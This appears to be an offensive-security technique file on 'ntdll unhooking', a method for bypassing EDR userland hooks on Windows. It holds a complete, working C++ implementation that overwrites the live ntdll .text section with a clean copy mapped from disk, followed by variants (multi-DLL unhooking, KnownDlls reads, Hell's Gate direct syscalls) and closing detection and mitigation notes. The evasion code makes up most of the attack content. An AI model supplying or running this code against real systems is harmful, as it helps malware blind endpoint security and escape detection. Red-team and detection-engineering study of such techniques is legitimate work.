---
name: ntdll-unhooking-edr-bypass
description: Restoring hooked ntdll.dll .text section from on-disk copy -- defeats userland EDR hooks by rewriting the inline detours set in-process. Section parsing, VirtualProtect, SEC_IMAGE mapping.
---

# ntdll Unhooking (EDR Userland Hook Bypass)

## Threat Model

Most commercial EDR userland agents (CrowdStrike, SentinelOne, Cylance, Defender ATP's in-process
hooks) install **inline hooks** inside `ntdll.dll` -- the first few bytes of `NtAllocateVirtualMemory`,
`NtCreateThreadEx`, `NtWriteVirtualMemory`, etc. are overwritten with a `jmp` into the EDR DLL's
telemetry function.

Because the EDR DLL is loaded into every process, every syscall gatekeeper has already been patched
by the time user code runs. If an attacker can **restore the clean bytes**, every subsequent syscall
through those functions bypasses the hook.

## Core Idea

The on-disk `C:\Windows\System32\ntdll.dll` has not been patched -- only the in-memory copy has.
Map a fresh copy from disk and splat its `.text` over the live module's `.text`. All inline hooks
vanish.

## Procedure

1. Get the base address of the in-memory `ntdll.dll` (`GetModuleHandleA("ntdll.dll")`).
2. Open the on-disk file and map it as `SEC_IMAGE` (so the loader lays it out identically to the
   mapped copy -- same offsets).
3. Walk the section headers of the in-memory copy.
4. For the `.text` section:
   - `VirtualProtect` to `PAGE_EXECUTE_READWRITE`.
   - `memcpy` from the disk-mapped `.text` to the live `.text`.
   - `VirtualProtect` back to the original (usually `PAGE_EXECUTE_READ`).
5. Clean up handles.

## Reference Implementation

```cpp
#include <Windows.h>
#include <psapi.h>

int main() {
    HANDLE process = GetCurrentProcess();
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

    MODULEINFO mi{};
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = mi.lpBaseOfDll;

    HANDLE ntdllFile    = CreateFileA("c:\\windows\\system32\\ntdll.dll",
                                      GENERIC_READ, FILE_SHARE_READ,
                                      NULL, OPEN_EXISTING, 0, NULL);
    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL,
                                            PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

    auto dos = (PIMAGE_DOS_HEADER)ntdllBase;
    auto nt  = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + dos->e_lfanew);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        auto sh = (PIMAGE_SECTION_HEADER)(
            (DWORD_PTR)IMAGE_FIRST_SECTION(nt) + (DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i);

        if (!strcmp((char*)sh->Name, ".text")) {
            DWORD oldProtect = 0;
            VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + sh->VirtualAddress),
                           sh->Misc.VirtualSize,
                           PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy((LPVOID)((DWORD_PTR)ntdllBase + sh->VirtualAddress),
                   (LPVOID)((DWORD_PTR)ntdllMappingAddress + sh->VirtualAddress),
                   sh->Misc.VirtualSize);
            VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + sh->VirtualAddress),
                           sh->Misc.VirtualSize,
                           oldProtect, &oldProtect);
        }
    }

    CloseHandle(ntdllFile);
    CloseHandle(ntdllMapping);
    return 0;
}
```

## Why `SEC_IMAGE` matters

Mapping with `SEC_IMAGE` tells the OS to lay out the file as if the loader had loaded it -- each
section at its declared `VirtualAddress`. Without `SEC_IMAGE`, the file would be mapped flat and
section offsets would be based on `PointerToRawData`, not `VirtualAddress`, misaligning the copy.

## Variants

- **Full module replacement** -- replace all executable sections, not just `.text`. Needed for some
  hooking engines that patch `RtlInsertElementGenericTable` or similar `.rdata` thunks.
- **Multi-DLL unhook** -- iterate the loader list, unhook `kernelbase.dll`, `kernel32.dll`,
  `win32u.dll`, `advapi32.dll`.
- **Perchance-fetching** -- rather than `CreateFileA`, read the raw bytes directly from
  `KnownDlls\ntdll.dll` section object (also unhooked, zero disk I/O telemetry).
- **Hell's Gate / Halo's Gate / Tartarus Gate** -- more elegant alternative: don't restore ntdll,
  instead parse clean syscall numbers from the on-disk copy or from unhooked neighbours and issue
  the syscall directly, bypassing the hook without modifying memory.

## Detection

- **Section hash checks** -- EDR re-hashes its own hooked region every N ms; mismatch triggers an
  event. CrowdStrike's `csagent` and SentinelOne's `SentinelAgent` both do this.
- **Memory protection anomaly** -- an unprivileged user process rarely calls `VirtualProtect` on
  ntdll's `.text` with `PAGE_EXECUTE_READWRITE`. ETW `Microsoft-Windows-Kernel-Memory`
  `MM_PROTECT_VIRTUAL_MEMORY` events capture this.
- **Hardware breakpoint on syscall stub** -- `Dr0..Dr3` can be set on the first byte of each hooked
  function; triggers if the overwritten jmp is removed.
- **Behavioural** -- the mere presence of two mapped copies of `ntdll.dll` (one `SEC_IMAGE`,
  attacker-opened) is a strong signal.

## Mitigations

- Kernel-mode hooks (minifilter + `PsSetLoadImageNotifyRoutine` + `PsSetCreateProcessNotifyRoutineEx`)
  cannot be removed from userland and sidestep the whole bypass.
- Protected Process Light (PPL) hosting of the EDR agent prevents the attacker from reading the
  agent DLL base to craft its own counter-unhook.
- Modern EDRs increasingly supplement userland hooks with ETW TI (`Microsoft-Windows-Threat-Intelligence`
  provider) so even if ntdll is restored, the syscall emits a telemetry event.
